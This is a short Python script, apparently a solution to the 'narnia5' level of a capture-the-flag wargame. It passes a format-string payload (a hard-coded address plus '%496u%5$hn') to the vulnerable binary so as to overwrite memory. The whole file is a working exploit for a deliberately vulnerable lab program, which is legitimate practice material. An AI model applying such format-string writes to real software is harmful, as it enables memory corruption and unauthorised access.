#! /usr/bin/python

import sys
import struct
from subprocess import call

if sys.byteorder == 'little':
	Q = lambda x: struct.pack("<I", x)
elif sys.byteorder == 'big':
	Q = lambda x: struct.pack(">I", x)

i_vaddr0 = Q(0xbffff03cL)

p = i_vaddr0 + "%496u%5$hn"

call(["./narnia5", p], shell=False, stderr=open("/dev/null", "w"))
